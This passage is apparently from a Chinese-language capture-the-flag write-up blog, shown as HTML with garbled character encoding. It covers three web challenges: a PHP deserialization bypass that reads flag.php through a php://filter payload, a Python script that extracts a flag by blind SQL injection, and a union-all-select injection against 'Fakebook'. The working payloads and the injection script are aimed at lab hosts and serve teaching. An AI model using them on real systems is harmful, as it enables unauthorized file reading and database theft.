class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç»è¿‡åˆ†æï¼Œè¿™ä¸ªé¢˜ç›®éœ€è¦ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–ä¹‹åçš„ç±»å¯¹è±¡ï¼Œå¹¶ä¸”è¦ç»•è¿‡ä¸¤å±‚é˜²æŠ¤ï¼š</p>
<p><strong>ä¸¤ä¸ªé˜²æŠ¤</strong></p>
<p><strong>is_valid()</strong><br>è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„strçš„æ¯ä¸ªå­—æ¯çš„ascliå€¼åœ¨32å’Œ125ä¹‹é—´ã€‚å› ä¸ºprotectedå±æ€§åœ¨åºåˆ—åŒ–ä¹‹åä¼šå‡ºç°ä¸å¯è§å­—ç¬¦\00*\00,ä¸ç¬¦åˆä¸Šé¢çš„è¦æ±‚ã€‚</p>
<p><strong>ç»•è¿‡æ–¹æ³•ï¼š</strong>å› ä¸ºphp7.1ä»¥ä¸Šçš„ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæ‰€ä»¥å¯ä»¥å°†å±æ€§æ”¹ä¸ºpublicï¼Œpublicå±æ€§åºåˆ—åŒ–ä¸ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ã€‚</p>
<p><strong>destruct()é­”æœ¯æ–¹æ³•</strong><br>op&#x3D;&#x3D;&#x3D;â€2â€ï¼Œæ˜¯å¼ºæ¯”è¾ƒ</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        $<span class="hljs-keyword">this</span>-&gt;process();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è€Œåœ¨process()å‡½æ•°ä¸­ï¼Œop&#x3D;&#x3D;â€2â€æ˜¯å¼±æ¯”è¾ƒ</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>            $<span class="hljs-keyword">this</span>-&gt;output($res);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥ä½¿ä¼ å…¥çš„opä¸ºæ•°å­—2ï¼Œä»è€Œä½¿ç¬¬ä¸€ä¸ªå¼ºæ¯”è¾ƒè¿”å›falseï¼Œè€Œä½¿ç¬¬äºŒä¸ªå¼±æ¯”è¾ƒè¿”å›true</p>
<p><strong>æœ¬åœ°è¿›è¡Œåºåˆ—åŒ–æ“ä½œ</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;1&quot;</span>;        <span class="hljs-comment">//å› ä¸ºdestruceå‡½æ•°ä¼šå°†contentæ”¹ä¸ºç©ºï¼Œæ‰€ä»¥contentçš„å€¼éšæ„ï¼ˆä½†æ˜¯è¦æ»¡è¶³is_valid()å‡½æ•°çš„è¦æ±‚ï¼‰</span><br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–ç»“æœï¼š<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p>
<p>payload:<code>?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</code></p>
<p>æŸ¥çœ‹æºç æ‰¾åˆ°flag</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ä¼ªåè®®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;2&quot;</span>;<br> <br>&#125;<br> <br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br> <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ä½¿ç”¨è¿‡base64è§£ç å¾—åˆ°flag</p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>All You Want Is In Table â€˜flagâ€™ and the column is â€˜flagâ€™<br>ç¡®å®šè¡¨å’Œå­—æ®µ</p>
<p>éšä¾¿è¾“å…¥<br>æŸ¥è¯¢1ï¼Œ2ä¼šæœ‰å›æ˜¾ï¼Œå…¶å®ƒçš„ä¼šæ˜¾ç¤ºé”™è¯¯<br>id&#x3D;1 Hello, glzjin wants a girlfriend.<br>id&#x3D;2 Do you want to be my girlfriend?<br>è¾“å…¥if(true,1,2) è¿”å›Hello, glzjin wants a girlfriend.<br>è¾“å…¥if(false,1,2) è¿”å›Do you want to be my girlfriend?</p>
<p>å¯ä»¥ç”¨è¿™ç§æ–¹æ³•åˆ¤æ–­flagçš„å€¼<br>å†™ä¸€ä¸ªè„šæœ¬(è¦ç”¨åˆ°time.sleepï¼Œä»¥é˜²å‡ºç°429é”™è¯¯ï¼Œè¿™ä¸ªè„šæœ¬æœ‰ä¸ªå°é—®é¢˜å°±æ˜¯å®ƒä¸èƒ½åŒ¹é…<code>-</code>ï¼Œæ‰€ä»¥è¦åœ¨ç©ºç¼ºçš„åœ°æ–¹æŠŠ<code>-</code>è¡¥å¥½ï¼Œåœ¨æˆ‘çš„æœºå™¨ä¸­time.sleep()æœ€å¥½çš„è®¾ç½®ä¸º0.1-0.4ï¼Œå› ä¸ºåˆ°äº†åé¢ä»ç„¶ä¸ä¼šæ˜¾ç¤º<code>-</code>)<br><strong>429é”™è¯¯</strong>ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚è¿‡å¤šï¼Œè¶…å‡ºäº†æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›æˆ–é™åˆ¶ã€‚ å®ƒæ˜¯ä¸€ç§ååº”é€Ÿç‡é™åˆ¶çš„çŠ¶æ€ç ï¼Œç”¨äºå‘ŠçŸ¥å®¢æˆ·ç«¯æš‚æ—¶æ— æ³•å¤„ç†è¯·æ±‚ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå½“æ”¶åˆ°429çŠ¶æ€ç æ—¶ï¼Œå®¢æˆ·ç«¯åº”è¯¥é‡‡å–æªæ–½å‡å°‘è¯·æ±‚é¢‘ç‡æˆ–ä¼˜åŒ–ä»£ç ï¼Œä»¥é™ä½æœåŠ¡å™¨çš„è´Ÿè½½ã€‚</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import time<br><br><span class="hljs-attribute">s</span>=requests.session()<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,60):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:<br>        <span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://becd3bf4-4a7a-41db-af52-6bc45f25b20e.node4.buuoj.cn:81/index.php&quot;</span><br>        <span class="hljs-attribute">sqls</span>=<span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;</span>.format(i,j)<br>        #<span class="hljs-built_in">print</span>(i)<br>        #<span class="hljs-built_in">print</span>(sqls)<br>        data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sqls&#125;<br>        c = s.post(url,<span class="hljs-attribute">data</span>=data)<br>        #<span class="hljs-built_in">print</span>(c.text)<br>        time.sleep(1.0)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> c.text:<br>            flag += j<br>            <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-built_in">print</span>(flag)<br>            break<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>


<h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>çœ‹åˆ°æ³¨å†Œé¦–å…ˆæƒ³åˆ°äº†å­˜å‚¨å‹xssï¼Œä¸€é¡¿xè¿”å›çš„PHPSESSIDå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨<br>æ­£å¸¸æ³¨å†Œblogå°±å¡«<code>www.baidu.com</code>æŠŠ<br>è‡ªåŠ¨è·³è½¬åˆ°ä¸‹ä¸€ä¸ªé¡µé¢åï¼Œå¯ä»¥å‘ç°usernameæ˜¯ä¸€ä¸ªè¶…é“¾æ¥<br>ç‚¹å‡»è¿›å…¥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://c5d58095-<span class="hljs-number">7</span>b7c-<span class="hljs-number">4</span>cad-b014-<span class="hljs-number">237</span>ca4cccdcf.node4.buuoj.cn:<span class="hljs-number">81</span>/view.php?no=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>ç–‘ä¼¼SQLæ³¨å…¥<br>è¿‡æ»¤äº†union select,ç”¨union all selectç»•è¿‡<br>payload:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,data,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>

<p>usernameåˆ—è¿”å›<code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; </code></p>
<p>å±äºæ˜¯è¢«åºåˆ—åŒ–äº†ï¼Œé‚£åº”è¯¥è¿˜æœ‰æˆ‘ä»¬åº”è¯¥çŸ¥é“çš„æºä»£ç æ²¡æœ‰æ‰¾åˆ°<br>dirsearchæ‰«ä¸€æ‰«<br>æ‰«å‡ºè¿™ä¹ˆå‡ ä¸ªèƒ½ç”¨çš„æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/db.php<br>/error.php<br>/flag.php<br>/login.php<br>/robots.txt<br>/view.php<br></code></pre></td></tr></table></figure>
<p>è¿›å…¥&#x2F;robots.txtæ‰¾åˆ°&#x2F;user.php.bak<br>ä¸‹è½½<br>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">12</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;/var/www/html/flag.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<span class="hljs-comment">//åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯</span><br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<span class="hljs-comment">//æ‰§è¡Œç»™å®šçš„cURLä¼šè¯</span><br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-comment">//è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>éœ€è¦äº†è§£çš„</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> get(<span class="hljs-variable">$url</span>)<br>   &#123;<br>       <span class="hljs-variable">$ch</span> = curl_init();<span class="hljs-regexp">//</span>åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯<br><br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<span class="hljs-regexp">//</span>ä¸ºç»™å®šçš„cURLä¼šè¯å¥æŸ„è®¾ç½®ä¸€ä¸ªé€‰é¡¹<br>       curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>       <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<span class="hljs-regexp">//</span>æ‰§è¡Œç»™å®šçš„cURLä¼šè¯<br>       <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<span class="hljs-regexp">//</span>è·å–ä¸€ä¸ªcURLè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>           return <span class="hljs-number">404</span>;<br>       &#125;<br>       curl_close(<span class="hljs-variable">$ch</span>);<br><br>       return <span class="hljs-variable">$output</span>;<br>   &#125;<br><br></code></pre></td></tr></table></figure>

<ul>
<li>curl_init ï¼š åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯ï¼Œä¾›curl_setopt(), curl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨ã€‚</li>
<li>curl_setopt ï¼š è¯·æ±‚ä¸€ä¸ªurlã€‚å…¶ä¸­CURLOPT_URLè¡¨ç¤ºéœ€è¦è·å–çš„URLåœ°å€ï¼Œåé¢å°±æ˜¯è·Ÿä¸Šäº†å®ƒçš„å€¼ã€‚</li>
<li>CURLOPT_RETURNTRANSFER å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡º</li>
<li>curl_execï¼ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œ æˆ–è€…åœ¨å¤±è´¥æ—¶è¿”å› FALSEã€‚ ç„¶è€Œï¼Œå¦‚æœ CURLOPT_RETURNTRANSFERé€‰é¡¹è¢«è®¾ç½®ï¼Œå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶ä¼šè¿”å›æ‰§è¡Œçš„ç»“æœï¼Œå¤±è´¥æ—¶è¿”å› FALSE ã€‚</li>
